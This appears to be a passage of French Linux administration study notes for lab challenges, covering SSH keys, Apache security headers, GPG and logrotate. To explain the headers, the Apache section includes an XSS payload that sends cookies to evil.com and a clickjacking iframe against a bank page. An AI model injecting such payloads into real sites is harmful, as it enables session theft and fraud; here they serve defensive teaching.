# Si clé SSH a passphrase → demande passphrase chaque connexion
# ssh-agent = cache passphrase session (enter 1x)

# Start ssh-agent
eval $(ssh-agent)
# Agent pid 12345

# Ajouter clé à agent
ssh-add ~/.ssh/id_rsa
# Enter passphrase: <password>
# Identity added: /home/user/.ssh/id_rsa (user@host)

# Lister clés chargées agent
ssh-add -l

# Supprimer clé agent
ssh-add -d ~/.ssh/id_rsa

# Supprimer toutes clés agent
ssh-add -D

# Connexions SSH suivantes : pas passphrase (agent cache)
```

### Troubleshooting SSH Keys

**Problem : ssh-copy-id demande password alors que déjà copié** :

```bash
# Vérifier clé publique présente authorized_keys serveur
ssh user@server "cat ~/.ssh/authorized_keys"
# Doit contenir contenu ~/.ssh/id_rsa.pub

# Vérifier permissions serveur
ssh user@server "ls -ld ~/.ssh/"
# drwx------ (700)
ssh user@server "ls -l ~/.ssh/authorized_keys"
# -rw------- (600)

# Corriger permissions serveur
ssh user@server "chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys"

# Vérifier SSH server config
ssh user@server "sudo grep PubkeyAuthentication /etc/ssh/sshd_config"
# PubkeyAuthentication yes (doit être activé)
```

**Problem : "Permission denied (publickey)"** :

```bash
# Debug verbose
ssh -v user@server
# Voir logs authentication process

# Vérifier clé utilisée
ssh -v user@server 2>&1 | grep "Offering public key"
# Offering public key: /home/user/.ssh/id_rsa RSA SHA256:...

# Forcer clé spécifique
ssh -i ~/.ssh/id_rsa user@server

# Vérifier serveur logs
ssh user@server "sudo tail -50 /var/log/secure"     # RHEL
ssh user@server "sudo tail -50 /var/log/auth.log"   # Debian
```

**Problem : "Host key verification failed"** :

```bash
# Serveur reinstallé → host key changée
# Supprimer ancienne clé known_hosts
ssh-keygen -R hostname

# Ou éditer ~/.ssh/known_hosts (supprimer ligne)
vi ~/.ssh/known_hosts
```

### SSH Security Best Practices

```bash
# 1. Toujours passphrase clés privées (production)
ssh-keygen -t ed25519 -C "user@host"
# Enter passphrase: <strong_password>

# 2. Utiliser ssh-agent (éviter enter passphrase répétitivement)
eval $(ssh-agent)
ssh-add ~/.ssh/id_rsa

# 3. Disable password auth serveurs (keys only)
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin no

sudo systemctl restart sshd

# 4. Restrict users SSH
# /etc/ssh/sshd_config
AllowUsers user1 user2
DenyUsers baduser

# 5. Change default SSH port (sécurité par obscurité)
# /etc/ssh/sshd_config
Port 2222

# 6. Firewall limiter IP sources
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.1.0/24" port port="22" protocol="tcp" accept'
sudo firewall-cmd --permanent --remove-service=ssh
sudo firewall-cmd --reload

# 7. Fail2ban (bloquer bruteforce)
sudo yum install fail2ban -y
sudo systemctl enable --now fail2ban
```

---

## Module 36 : Apache Security Headers (Challenge 20)

**Concepts :**
- **Security Headers HTTP** : En-têtes réponse HTTP protection contre attaques web
- **mod_headers** : Module Apache manipulation headers HTTP request/response
- **Web Hardening** : Durcissement serveur web (configuration sécurisée)

### Security Headers HTTP (Protection Navigateurs)

**1. X-XSS-Protection** :

```apache
Header set X-XSS-Protection "1; mode=block"
```

**Fonction** : Protection Cross-Site Scripting (XSS) attacks via filtre navigateur.

**Valeurs** :
- `0` : Désactiver XSS filter (⚠️ dangereux)
- `1` : Activer XSS filter (sanitize code malicieux)
- `1; mode=block` : Bloquer page entière si XSS détecté (recommandé)

**Attack scenario (XSS)** :
```javascript
// Attacker injecte script malicieux dans formulaire
<script>document.location='http://evil.com?cookie='+document.cookie</script>

// Sans X-XSS-Protection : Script exécuté → vol cookies
// Avec X-XSS-Protection : Navigateur détecte + bloque page
```

**⚠️ Status deprecated** :
- Chrome, IE, Safari : Support (mais removing progressivement)
- Firefox : **Pas de support** (considère inefficace)
- **Modern alternative** : Content-Security-Policy (CSP)

**Browsers support** :
| Browser | Support X-XSS-Protection | Alternative |
|---------|--------------------------|-------------|
| Chrome | ✅ (deprecated) | CSP obligatoire |
| Firefox | ❌ Never supported | CSP uniquement |
| Safari | ✅ | CSP recommandé |
| Edge | ✅ (deprecated) | CSP obligatoire |

**Migration CSP** :
```apache
# X-XSS-Protection (legacy)
Header set X-XSS-Protection "1; mode=block"

# Content-Security-Policy (modern)
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com"
```

---

**2. X-Frame-Options** :

```apache
Header always append X-Frame-Options SAMEORIGIN
```

**Fonction** : Protection Clickjacking attacks (iframes malicieuses).

**Valeurs** :
- `DENY` : Interdit TOUTE iframe (max sécurité)
- `SAMEORIGIN` : Autorise iframe si même origine (domaine)
- `ALLOW-FROM https://example.com` : Whitelist URL (⚠️ deprecated)

**Attack scenario (Clickjacking)** :
```html
<!-- Site malicieux evil.com -->
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute">
</iframe>
<button style="position:absolute">Click for FREE prize!</button>

<!-- User clique bouton → clique réellement iframe invisible bank.com → transfer argent -->
```

**Sans X-Frame-Options** : Iframe bank.com charge → clickjacking possible.  
**Avec X-Frame-Options: DENY** : Iframe refuse charger → protection.

**Quand utiliser quelle valeur** :

| Valeur | Use Case | Exemple |
|--------|----------|---------|
| `DENY` | Sites JAMAIS iframe (banking, admin panels) | PayPal, AWS Console |
| `SAMEORIGIN` | Sites iframe possible same domain (dashboards) | WordPress admin, apps internes |
| ~~ALLOW-FROM~~ | ❌ Deprecated (utiliser CSP) | N/A |

**Modern alternative CSP** :
```apache
# X-Frame-Options (legacy)
Header set X-Frame-Options "DENY"

# Content-Security-Policy frame-ancestors (modern, plus flexible)
Header set Content-Security-Policy "frame-ancestors 'none'"  # Équivalent DENY
Header set Content-Security-Policy "frame-ancestors 'self'"  # Équivalent SAMEORIGIN
Header set Content-Security-Policy "frame-ancestors https://trusted.com"  # Whitelist
```

**Test Clickjacking** :
```html
<!-- test-clickjacking.html -->
<iframe src="https://votresite.com"></iframe>

<!-- Si X-Frame-Options actif : Error console navigateur -->
<!-- "Refused to display 'https://votresite.com' in a frame because it set 'X-Frame-Options' to 'deny'" -->
```

---

**3. X-Content-Type-Options** :

```apache
Header set X-Content-Type-Options nosniff
```

**Fonction** : Empêcher MIME-type sniffing navigateurs (forcer respect Content-Type header).

**Valeur** : `nosniff` (unique valeur valide).

**MIME sniffing attack scenario** :
```bash
# Attacker upload fichier malicieux "avatar.txt"
# Contenu fichier : <script>alert('XSS')</script>

# Serveur retourne : Content-Type: text/plain
# Sans nosniff : Browser "sniff" contenu → détecte HTML → exécute script ❌
# Avec nosniff : Browser respecte text/plain → affiche texte brut (pas exécute) ✅
```

**Types files vulnérables** :
- **Uploads users** : Images, documents (peuvent contenir scripts)
- **CSS files** : Navigateur peut interpréter comme HTML si mal configuré
- **JavaScript files** : Exécution code si Content-Type incorrect

**Example problème** :
```apache
# Configuration BROKEN
<FilesMatch "\.css$">
    Header set Content-Type "text/html"  # ❌ Incorrect Content-Type
</FilesMatch>

# Sans nosniff : Navigateur exécute CSS comme HTML (XSS possible)
# Avec nosniff : Navigateur refuse (erreur console)
```

**Best practice** :
```apache
# TOUJOURS combiner nosniff + correct Content-Type
Header set X-Content-Type-Options nosniff

<FilesMatch "\.css$">
    Header set Content-Type "text/css"  # ✅ Correct
</FilesMatch>

<FilesMatch "\.js$">
    Header set Content-Type "application/javascript"  # ✅ Correct
</FilesMatch>
```

**Browser support** : ✅ Universel (Chrome, Firefox, Safari, Edge).

---

### mod_headers Apache Module

**Module** : `mod_headers` (manipulation headers HTTP request/response).

**Activer module** :
```bash
# RHEL/CentOS (généralement activé par défaut)
httpd -M | grep headers
# headers_module (shared) → actif

# Si absent :
sudo vi /etc/httpd/conf.modules.d/00-base.conf
# Ajouter :
LoadModule headers_module modules/mod_headers.so

# Debian/Ubuntu
sudo a2enmod headers
sudo systemctl restart apache2
```

**Directives principales** :

**1. Header set** :
```apache
# Définir header (écrase si existe déjà)
Header set X-Custom-Header "value"

# Example :
Header set X-Powered-By "My Custom Server"
```

**2. Header append** :
```apache
# Ajouter header (multiple valeurs même nom possible)
Header append Cache-Control "public"

# Résultat : Cache-Control peut avoir multiple valeurs
```

**3. Header always** :
```apache
# Appliquer MÊME si réponse erreur (4xx, 5xx)
Header always set X-Frame-Options "DENY"

# Sans always : Header absent si 404, 500
# Avec always : Header présent toujours (protection continue)
```

**4. Header unset** :
```apache
# Supprimer header (sécurité - cacher info serveur)
Header unset X-Powered-By
Header unset Server

# Résultat : Headers pas envoyés clients (hide version Apache, PHP)
```

**5. Header edit** :
```apache
# Modifier header existant (regex)
Header edit Set-Cookie ^(.*)$ "$1; HttpOnly; Secure"

# Ajoute flags HttpOnly + Secure à tous cookies
```

**Conditions directives** :

**IfModule (si module chargé)** :
```apache
<IfModule headers_module>
    Header set X-Security "enabled"
</IfModule>

# Évite erreur si mod_headers pas disponible
```

**Environnement variable** :
```apache
# Si HTTPS actif
Header set Strict-Transport-Security "max-age=31536000" env=HTTPS

# Si custom variable
SetEnvIf Request_URI "^/admin" ADMIN_AREA
Header set X-Admin "true" env=ADMIN_AREA
```

**Content-Type spécifique** :
```apache
# Header uniquement pour PDFs
<FilesMatch "\.pdf$">
    Header set X-Robots-Tag "noindex, nofollow"
</FilesMatch>

# Header uniquement pour HTML
<FilesMatch "\.(html|htm)$">
    Header set X-XSS-Protection "1; mode=block"
</FilesMatch>
```

**Status code spécifique** :
```apache
# Header uniquement si 200 OK
Header set Cache-Control "max-age=3600" "expr=%{REQUEST_STATUS} == 200"

# Header uniquement si erreur
Header always set X-Error "true" "expr=%{REQUEST_STATUS} >= 400"
```

### Apache Port Custom Configuration

**Modifier port écoute Apache** :
```apache
# /etc/httpd/conf/httpd.conf
Listen 6100

# Multiple ports
Listen 80
Listen 443
Listen 6100
Listen 8080
```

**⚠️ SELinux context** (RHEL/CentOS si SELinux actif) :
```bash
# Autoriser Apache port non-standard
sudo semanage port -a -t http_port_t -p tcp 6100

# Vérifier ports autorisés SELinux
sudo semanage port -l | grep http_port_t
# http_port_t   tcp   80, 443, 488, 8008, 8009, 8443, 9000, 6100
```

**Firewall (firewalld)** :
```bash
# Ouvrir port custom
sudo firewall-cmd --permanent --add-port=6100/tcp
sudo firewall-cmd --reload

# Vérifier
sudo firewall-cmd --list-ports
```

**VirtualHost port custom** :
```apache
Listen 6100

<VirtualHost *:6100>
    ServerName example.com
    DocumentRoot /var/www/html
    
    <IfModule headers_module>
        Header set X-XSS-Protection "1; mode=block"
        Header always append X-Frame-Options SAMEORIGIN
        Header set X-Content-Type-Options nosniff
    </IfModule>
</VirtualHost>
```

### httpd -t (Syntax Validation)

**Commande CRITICAL avant restart Apache** :
```bash
sudo httpd -t
```

**Outputs** :
```
Syntax OK                           # ✅ Config valide
AH00526: Syntax error on line 42... # ❌ Erreur ligne 42
```

**Safe restart workflow** :
```bash
# Méthode 1 : Conditionnel
sudo httpd -t && sudo systemctl restart httpd

# Méthode 2 : Script
if sudo httpd -t; then
    sudo systemctl reload httpd
    echo "Apache config reloaded successfully"
else
    echo "Config INVALID - reload aborted"
fi
```

**httpd -S (VirtualHosts dump)** :
```bash
sudo httpd -S
```

**Output** :
```
VirtualHost configuration:
*:80                   example.com (/etc/httpd/conf.d/example.conf:1)
*:6100                 is a NameVirtualHost
         default server example.com (/etc/httpd/conf/httpd.conf:120)
```

### Security Headers Best Practices

**Configuration minimale production** :
```apache
<IfModule headers_module>
    # XSS Protection (legacy browsers)
    Header set X-XSS-Protection "1; mode=block"
    
    # Clickjacking protection
    Header always set X-Frame-Options "SAMEORIGIN"
    
    # MIME sniffing protection
    Header set X-Content-Type-Options "nosniff"
    
    # Hide Apache version
    Header unset Server
    Header set Server "WebServer"
    
    # Referrer policy
    Header set Referrer-Policy "strict-origin-when-cross-origin"
</IfModule>

# ServerTokens (hide version)
ServerTokens Prod
ServerSignature Off
```

**Configuration avancée (HTTPS)** :
```apache
<IfModule headers_module>
    # HSTS (HTTPS strict)
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" env=HTTPS
    
    # CSP (Content Security Policy)
    Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'"
    
    # Permissions Policy (anciennement Feature-Policy)
    Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"
    
    # Expect-CT (Certificate Transparency)
    Header set Expect-CT "max-age=86400, enforce"
</IfModule>
```

**Test headers** :
```bash
# Local
curl -I http://localhost:6100

# Remote
curl -I https://votresite.com

# Tools online
# https://securityheaders.com
# https://observatory.mozilla.org
```

**Score SecurityHeaders.com** :

| Headers présents | Score | Rating |
|------------------|-------|--------|
| Aucun | F | ❌ Fail |
| X-Frame-Options + X-Content-Type-Options | D | ⚠️ Poor |
| + CSP basic | C | ⚠️ Average |
| + HSTS + Referrer-Policy | B | ✅ Good |
| + CSP strict + Permissions-Policy | A | ✅✅ Excellent |

### Headers HTTP vs HTTPS

**HTTP (port 80)** :
```apache
# Headers basiques sécurité
Header set X-Frame-Options "SAMEORIGIN"
Header set X-Content-Type-Options "nosniff"

# PAS de HSTS (HTTPS uniquement)
# Header set Strict-Transport-Security → ERREUR (HTTP pas supporté)
```

**HTTPS (port 443)** :
```apache
<VirtualHost *:443>
    SSLEngine on
    
    <IfModule headers_module>
        # Headers HTTPS-only
        Header always set Strict-Transport-Security "max-age=31536000" env=HTTPS
        Header set Expect-CT "max-age=86400" env=HTTPS
        
        # Headers généraux
        Header set X-Frame-Options "SAMEORIGIN"
        Header set X-Content-Type-Options "nosniff"
    </IfModule>
</VirtualHost>
```

---

## Module 37 : GPG Encryption (GNU Privacy Guard) - Challenge 22

**Concepts :**
- **GPG** : GNU Privacy Guard (implémentation open source OpenPGP)
- **Asymmetric Encryption** : Chiffrement clés publique/privée (2 clés différentes)
- **Public Key Cryptography** : Clé publique (chiffrer) + clé privée (déchiffrer)
- **Passphrase** : Password protégeant clé privée

### GPG Introduction

**GPG (GNU Privacy Guard)** : Suite outils cryptographie open source (standard OpenPGP RFC 4880).

**Use cases** :
- **Encryption fichiers** : Données confidentielles (passwords, données clients, backups)
- **Encryption emails** : Communication sécurisée (PGP/MIME standard)
- **Digital signatures** : Authentifier authorship fichiers (packages Linux, commits Git)
- **Authentication** : SSH via gpg-agent (alternative ssh-agent)

**Comparaison alternatives** :

| Outil | Type | Use Case | Complexité |
|-------|------|----------|------------|
| **GPG** | Asymmetric + Symmetric | Emails, files, signatures | ⚠️ High |
| **Age** | Asymmetric (modern) | Files encryption (simple) | ✅ Low |
| **OpenSSL** | Asymmetric + Symmetric | TLS/SSL, certificates, crypto général | ⚠️ Very High |
| **VeraCrypt** | Symmetric | Full disk encryption | ⚠️ Medium |
| **7-Zip AES** | Symmetric | Archives password-protected | ✅ Low |

**GPG vs PGP** :

| Critère | GPG | PGP |
|---------|-----|-----|
| Licence | ✅ GPL (open source) | ❌ Commercial (Symantec) |
| Standard | OpenPGP (RFC 4880) | OpenPGP (original) |
| Coût | ✅ Gratuit | ❌ Payant (~$100/an) |
| Plateforme | Linux, Windows, macOS | Windows, macOS |
| Use case | Standard Linux/Unix | Enterprise Windows |

### Public Key Cryptography (Asymmetric)

**Principe** : 2 clés mathématiquement liées, fonctions opposées.

**Clé publique** :
- **Distribution** : Libre (email, keyservers, website, GitHub)
- **Usage** : Chiffrer messages POUR vous, vérifier signatures DE vous
- **Analogie** : Cadenas ouvert (tout le monde peut fermer, personne ouvre)

**Clé privée** :
- **Distribution** : JAMAIS (secrète absolue, protégée passphrase)
- **Usage** : Déchiffrer messages pour VOUS, créer signatures DE vous
- **Analogie** : Clé unique cadenas (seul vous ouvrez)

**Propriétés mathématiques** :
- Message chiffré clé publique Alice → SEULE clé privée Alice déchiffre
- Message signé clé privée Bob → SEULE clé publique Bob vérifie signature

**Workflow encryption (Alice → Bob)** :

```
1. Bob génère paire clés : public_bob + private_bob
2. Bob publie public_bob (keyserver, email)
3. Alice récupère public_bob
4. Alice chiffre message avec public_bob → ciphertext
5. Alice envoie ciphertext à Bob (interception OK, illisible)
6. Bob déchiffre ciphertext avec private_bob → plaintext
```

**Avantages vs Symmetric** :

| Critère | Asymmetric (GPG) | Symmetric (AES) |
|---------|------------------|-----------------|
| **Key exchange** | ✅ Pas nécessaire (clé publique libre) | ❌ Requis (secret partagé) |
| **Scalabilité** | ✅ N users = N paires clés | ❌ N users = N(N-1)/2 clés |
| **Signatures** | ✅ Built-in (non-répudiation) | ❌ Impossible |
| **Performance** | ⚠️ Lent (RSA 2048-bit) | ✅ Rapide (AES) |
| **Use case** | Emails, files, PKI | Disk encryption, VPN |

**Hybrid encryption (GPG default)** :
```
1. GPG génère clé symétrique AES aléatoire (session key)
2. GPG chiffre fichier avec AES session key (rapide)
3. GPG chiffre session key avec RSA clé publique recipient (petit)
4. Output : Encrypted file (AES) + Encrypted session key (RSA)

Decryption :
1. GPG déchiffre session key avec RSA clé privée
2. GPG déchiffre fichier avec AES session key
```

### GPG Installation

```bash
# RHEL/CentOS/Rocky
sudo yum install gnupg2 -y

# Debian/Ubuntu
sudo apt install gnupg -y

# Vérifier version
gpg --version
# gpg (GnuPG) 2.2.20
```

### GPG Keys Management

**Générer paire clés** :
```bash
gpg --full-generate-key
```

**Prompts** :
```
(1) RSA and RSA (default)       # Type clés (recommandé)
What keysize? 4096              # 2048 minimum, 4096 recommandé
Key valid for? 0                # 0 = jamais expire (ou 1y, 2y, etc.)
Real name: John Doe
Email: john@example.com
Comment: Work key               # Optionnel
Passphrase: <strong_password>   # CRITICAL (protect clé privée)
```

**Output** :
```
gpg: key ABCD1234 marked as ultimately trusted
public and secret key created and signed.

pub   rsa4096 2026-01-17 [SC]
      ABCD1234ABCD1234ABCD1234ABCD1234ABCD1234
uid           John Doe (Work key) <john@example.com>
sub   rsa4096 2026-01-17 [E]
```

**Lister clés publiques** :
```bash
gpg --list-keys
gpg -k  # Alias
```

**Output** :
```
/home/user/.gnupg/pubring.kbx
-----------------------------
pub   rsa4096 2026-01-17 [SC]
      ABCD1234ABCD1234ABCD1234ABCD1234ABCD1234
uid           [ultimate] John Doe (Work key) <john@example.com>
sub   rsa4096 2026-01-17 [E]
```

**Lister clés privées** :
```bash
gpg --list-secret-keys
gpg -K  # Alias
```

**Import clé (publique ou privée)** :
```bash
gpg --import keyfile.asc
```

**Export clé publique** :
```bash
# Binary
gpg --export john@example.com > public.key

# ASCII armor (email-safe)
gpg --export -a john@example.com > public.asc
```

**Export clé privée (⚠️ SENSIBLE)** :
```bash
# ASCII armor
gpg --export-secret-keys -a john@example.com > private.asc

# ⚠️ Backup clé privée sécurisé (encrypted USB, password manager)
```

**Supprimer clés** :
```bash
# Supprimer clé privée (DOIT être avant publique)
gpg --delete-secret-keys john@example.com

# Supprimer clé publique
gpg --delete-keys john@example.com
```

### GPG Encryption / Decryption

**Encrypt fichier** :
```bash
# Basic
gpg -e -r recipient@example.com file.txt
# Output : file.txt.gpg (binaire)

# ASCII armor (email-safe)
gpg -e -a -r recipient@example.com file.txt
# Output : file.txt.asc (base64 texte)

# Spécifier output file
gpg -o encrypted.asc -e -r recipient@example.com file.txt
```

**Options encrypt** :
- `-e` : Encrypt mode
- `-r recipient` : Recipient (user ID, email, key ID)
- `-a` : ASCII armor (output texte)
- `-o file` : Output filename

**Multiple recipients** :
```bash
# Alice ET Bob peuvent déchiffrer
gpg -e -r alice@example.com -r bob@example.com file.txt
```

**Decrypt fichier** :
```bash
# Output stdout
gpg -d file.txt.gpg

# Output file
gpg -o decrypted.txt -d file.txt.gpg

# Prompt passphrase si clé privée protégée
```

**Challenge 22 workflow** :
```bash
# Import clés
gpg --import public_key.asc
gpg --import private_key.asc

# Encrypt
gpg -o encrypted_me.asc -r kodekloud@kodekloud.com -e encrypt_me.txt

# Decrypt (enter passphrase "kodekloud")
gpg -o decrypted_me.txt -r kodekloud@kodekloud.com -d decrypt_me.asc
```

### GPG Symmetric Encryption (Password-based)

**Use case** : Chiffrement simple sans clés publique/privée (1 password).

```bash
# Encrypt (demande password 2x)
gpg -c file.txt
# Output : file.txt.gpg

# Decrypt (demande password)
gpg -d file.txt.gpg > file.txt
```

**Différence Asymmetric vs Symmetric** :

| Critère | Asymmetric (`-e -r`) | Symmetric (`-c`) |
|---------|----------------------|------------------|
| **Clés** | Public/Private pair | Password uniquement |
| **Use case** | Email, multi-users | Personal backups |
| **Security** | ✅ Pas password exchange | ⚠️ Password doit être secret partagé |
| **Performance** | ⚠️ Plus lent | ✅ Rapide |

### GPG Signatures (Authentification)

**Sign fichier** :
```bash
# Sign + encrypt (binary)
gpg --sign file.txt
# Output : file.txt.gpg

# Detached signature (fichier séparé)
gpg --detach-sign file.txt
# Output : file.txt.sig (distribuer avec file.txt original)

# Clear-text signature (texte lisible + signature)
gpg --clearsign file.txt
# Output : file.txt.asc
```

**Vérifier signature** :
```bash
# Detached signature
gpg --verify file.txt.sig file.txt

# Output si valide :
gpg: Signature made Sat 17 Jan 2026 10:00:00 AM UTC
gpg:                using RSA key ABCD1234
gpg: Good signature from "John Doe <john@example.com>" [ultimate]
```

**Encrypt + Sign** :
```bash
# Chiffrer + signer (confidentialité + authentification)
gpg -e -s -r recipient@example.com file.txt
```

**Use cases signatures** :
- **Linux packages** : RPM, DEB signés (vérifier authorship)
- **Git commits** : `git commit -S` (signer commits)
- **Software releases** : Checksums signés (SHA256SUMS.asc)

### GPG Passphrase Management

**Importance passphrase** :
- Clé privée volée SANS passphrase → attacker déchiffre TOUT
- Clé privée volée AVEC passphrase → attacker doit bruteforce (protection temps)

**Best practices passphrase** :
- **Longueur** : 20+ caractères (phrase complète)
- **Complexité** : Mix majuscules/minuscules/chiffres/symboles
- **Unique** : Pas réutilisée (1 passphrase = 1 clé)
- **Stockage** : Password manager (Bitwarden, KeePass, LastPass)
- **Backup** : Clé privée + passphrase backup sécurisé (encrypted USB)

**Changer passphrase** :
```bash
gpg --edit-key john@example.com
```

**Commandes interactives** :
```
gpg> passwd
# Enter ancien passphrase
# Enter nouveau passphrase 2x
gpg> save
```

**Supprimer passphrase (⚠️ dangereux production)** :
```
gpg> passwd
# Enter ancien passphrase
# Nouveau passphrase : (laisser vide)
# Confirmer vide
gpg> save
```

### GPG File Formats

**Binary (.gpg)** :
- Format binaire compact
- Extension : `.gpg`
- Plus petit (efficace large files)
- Pas email-safe (corruption possible SMTP)

**ASCII Armor (.asc)** :
- Format texte base64
- Extension : `.asc`
- Email-safe (caractères ASCII uniquement)
- ~33% plus gros que binary

**Exemple ASCII armor** :
```
-----BEGIN PGP MESSAGE-----

hQEMA5rYc2hVSlp4AQf+KqZHzjZNT7ZFKjvfJn7aS9Gv2YqR3Zp4Wt8Xc5Nd6Kf
7Hg9Jk1Lm2Np3Qr4St5Uv6Wx7Yz8A9B0C1D2E3F4G5H6I7J8K9L0M1N2O3P4Q5R
...
=abcd
-----END PGP MESSAGE-----
```

**Choisir format** :
```bash
# Binary (défaut)
gpg -e file.txt  # Output : file.txt.gpg

# ASCII armor
gpg -e -a file.txt  # Output : file.txt.asc
```

### GPG Keyservers (Public Key Distribution)

**Concept** : Serveurs publics stockent clés publiques GPG (annuaire).

**Popular keyservers** :
- `keyserver.ubuntu.com`
- `keys.openpgp.org`
- `pgp.mit.edu`

**Upload clé publique** :
```bash
gpg --keyserver keyserver.ubuntu.com --send-keys ABCD1234
```

**Download clé publique** :
```bash
gpg --keyserver keyserver.ubuntu.com --recv-keys ABCD1234
```

**Search clé** :
```bash
gpg --keyserver keyserver.ubuntu.com --search-keys john@example.com
```

**Refresh clés (update)** :
```bash
gpg --keyserver keyserver.ubuntu.com --refresh-keys
```

### GPG Trust Levels

**Concept** : Web of Trust (réseau confiance décentralisé).

**Trust levels** :
- **Unknown** : Clé jamais évaluée (défaut import)
- **Never** : Clé explicitement PAS fiable
- **Marginal** : Clé partiellement fiable
- **Full** : Clé complètement fiable
- **Ultimate** : Clé propre (own keys)

**Éditer trust** :
```bash
gpg --edit-key john@example.com
```

**Commandes** :
```
gpg> trust
# 1 = I don't know or won't say
# 2 = I do NOT trust
# 3 = I trust marginally
# 4 = I trust fully
# 5 = I trust ultimately (own keys only)
gpg> save
```

**Signer clé (web of trust)** :
```bash
gpg --sign-key john@example.com
# Crée signature attestant identité John Doe = john@example.com
```

### GPG Troubleshooting

**Error: "No secret key"** :
```bash
gpg: decryption failed: No secret key
```

**Cause** : Clé privée pas importée ou pas correspondante.

**Solution** :
```bash
# Vérifier clés privées
gpg -K

# Import clé privée
gpg --import private_key.asc
```

**Error: "Public key not found"** :
```bash
gpg: recipient@example.com: skipped: No public key
```

**Cause** : Clé publique recipient pas dans keyring.

**Solution** :
```bash
# Import clé publique
gpg --import public_key.asc

# Ou download keyserver
gpg --keyserver keyserver.ubuntu.com --recv-keys ABCD1234
```

**Error: "Invalid passphrase"** :
```bash
gpg: decryption failed: Bad passphrase
```

**Cause** : Passphrase incorrect.

**Solution** : Retry avec correct passphrase. Si oublié → **clé perdue** (impossible récupérer).

**Warning: "Unsafe permissions"** :
```bash
gpg: WARNING: unsafe permissions on homedir '/home/user/.gnupg'
```

**Solution** :
```bash
chmod 700 ~/.gnupg
chmod 600 ~/.gnupg/*
```

---

## Module 38 : LogRotate - Gestion Rotation Logs (Challenge 23)

**Concepts :**
- **LogRotate** : Utilitaire automatisation rotation logs (compression, suppression anciens logs)
- **Rotation** : Archivage log actuel + création nouveau log vide
- **Compression** : Réduction taille logs (.gz) économise espace disque
- **Rétention** : Nombre rotations conservées (historique)

### LogRotate Introduction

**Problème** : Services génèrent logs continuellement → fichiers logs Gigaoctets → saturation disque.

**Solution LogRotate** :
1. **Rotation périodique** : daily/weekly/monthly (log actuel → archive)
2. **Compression** : Archives gzip (~90% réduction taille)
3. **Suppression anciens** : Rétention limitée (ex: 7 jours, 3 mois)
4. **Automatique** : Cron job quotidien (`/etc/cron.daily/logrotate`)

**Example rotation** :
```
Jour 1 : app.log (10 MB actuel)
Jour 2 : app.log (nouveau vide), app.log.1.gz (10 MB compressé → 1 MB)
Jour 3 : app.log, app.log.1.gz, app.log.2.gz
...
Jour 8 : app.log, app.log.1.gz ... app.log.7.gz (rotation 8 supprimée)
```

**Services utilisant LogRotate** :
- **Apache/Nginx** : `/var/log/httpd/access_log`, `/var/log/nginx/access.log`
- **HAProxy** : `/var/log/haproxy.log` (Challenge 23)
- **System logs** : `/var/log/messages`, `/var/log/syslog`
- **Application logs** : Custom apps (MySQL, PostgreSQL, etc.)

### LogRotate Installation

```bash
# RHEL/CentOS/Rocky
sudo yum install logrotate -y

# Debian/Ubuntu
sudo apt install logrotate -y

# Vérifier version
logrotate --version
# logrotate 3.18.0
```

### LogRotate Configuration Files

**Fichier principal** :
```bash
/etc/logrotate.conf   # Config globale (options par défaut)
```

**Fichiers services** :
```bash
/etc/logrotate.d/     # Répertoire configs spécifiques services
# Examples :
/etc/logrotate.d/httpd        # Apache
/etc/logrotate.d/nginx        # Nginx
/etc/logrotate.d/haproxy      # HAProxy (Challenge 23)
/etc/logrotate.d/mysql        # MySQL
/etc/logrotate.d/syslog       # System logs
```

**Structure config file** :
```bash
# /etc/logrotate.d/haproxy
/var/log/haproxy.log {
    monthly              # Fréquence rotation
    rotate 3             # Nombre rotations conservées
    missingok            # Pas erreur si log absent
    notifempty           # Pas rotation si log vide
    compress             # Compression gzip
    delaycompress        # Compression rotation suivante (pas immédiate)
    sharedscripts        # Script postrotate exécuté 1x (pas par log)
    postrotate           # Commandes après rotation
        /bin/kill -HUP `cat /var/run/syslog.pid 2> /dev/null` 2> /dev/null || true
    endscript
}
```

### LogRotate Options (Directives)

**Fréquences rotation** :
```bash
daily       # Quotidien (tous les jours)
weekly      # Hebdomadaire (dimanche par défaut)
monthly     # Mensuel (1er du mois)
yearly      # Annuel (1er janvier)
size 100M   # Taille trigger (rotation si > 100 MB)
```

**Rétention (nombre rotations)** :
```bash
rotate 7    # Conserver 7 rotations (log.1.gz ... log.7.gz)
rotate 3    # Conserver 3 rotations (Challenge 23)
rotate 0    # Pas rétention (suppression immédiate)
maxage 30   # Supprimer rotations > 30 jours
```

**Compression** :
```bash
compress            # Activer compression gzip (log.1.gz)
nocompress          # Désactiver compression (log.1)
delaycompress       # Compression différée (rotation suivante)
compresscmd gzip    # Commande compression (défaut gzip)
compressext .gz     # Extension compression
compressoptions -9  # Options compression (niveau 9 max)
uncompresscmd gunzip # Commande décompression
```

**Gestion erreurs** :
```bash
missingok           # Pas erreur si log absent
nomissingok         # Erreur si log absent (défaut)
ifempty             # Rotation même si log vide (défaut)
notifempty          # Pas rotation si log vide
```

**Actions post-rotation** :
```bash
postrotate
    /usr/bin/killall -HUP syslogd
endscript

# OU
sharedscripts       # Script exécuté 1x (pas par log)
postrotate
    systemctl reload nginx
endscript
```

**Permissions & ownership** :
```bash
create 0644 root root    # Créer nouveau log (mode, owner, group)
nocreate                 # Pas créer nouveau log
copytruncate             # Copier log actuel puis truncate (pas rename)
```

**Autres options** :
```bash
dateext             # Suffixe date (log-20260117.gz au lieu de log.1.gz)
dateformat -%Y%m%d  # Format date
olddir /var/log/old # Déplacer rotations répertoire spécifique
noolddir            # Rotations même répertoire (défaut)
mail admin@example.com  # Envoyer email rotation
nomail              # Pas email (défaut)
```

### LogRotate Testing & Debugging

**Test configuration (dry-run)** :
```bash
# Test sans rotation effective (verbose)
sudo logrotate -d /etc/logrotate.d/haproxy

# Output :
# rotating pattern: /var/log/haproxy.log  monthly (3 rotations)
# empty log files are not rotated, old logs are removed
```

**Forcer rotation immédiate** :
```bash
# Force rotation (test manuel)
sudo logrotate -f /etc/logrotate.d/haproxy

# Vérifier rotations créées
ls -lh /var/log/haproxy*
# haproxy.log         (nouveau vide)
